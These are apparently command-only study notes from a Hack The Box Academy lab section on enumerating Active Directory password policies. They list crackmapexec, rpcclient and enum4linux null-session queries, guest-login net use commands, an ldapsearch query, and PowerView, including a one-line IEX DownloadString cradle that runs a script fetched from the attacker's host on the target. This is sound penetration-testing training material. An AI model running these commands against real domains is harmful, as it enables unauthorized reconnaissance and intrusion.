# Section 9: Enumerating & Retrieving Password Policies

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1490
- Code/command blocks: 12

> Terminal output is omitted; only commands & scripts are captured.

```bash
crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --pass-pol
```

```bash
rpcclient -U "" -N {{DC_IP}}
```

```bash
enum4linux -P {{DC_IP}}
```

```bash
enum4linux-ng -P {{DC_IP}} -oA ilfreight
```

```bash
cat ilfreight.json 
```

```cmd
net use \\DC01\ipc$ "" /u:""
```

```cmd
net use \\DC01\ipc$ "" /u:guest
```

```cmd
net use \\DC01\ipc$ "password" /u:guest
```

```bash
ldapsearch -H ldap://{{DC_IP}} -x -b "DC={{DOMAIN_NB}},DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

```cmd
net accounts
```

> **Get PowerView** (used here and in 15/18/20/21/24). It ships on Kali — no download needed: `cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .` (or `wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1`), serve it (`python3 -m http.server 80`), then load on target: `IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}/PowerView.ps1')`. See [16](16-living-off-the-land.md) for transfer options.

```powershell
import-module .\PowerView.ps1
Get-DomainPolicy
```

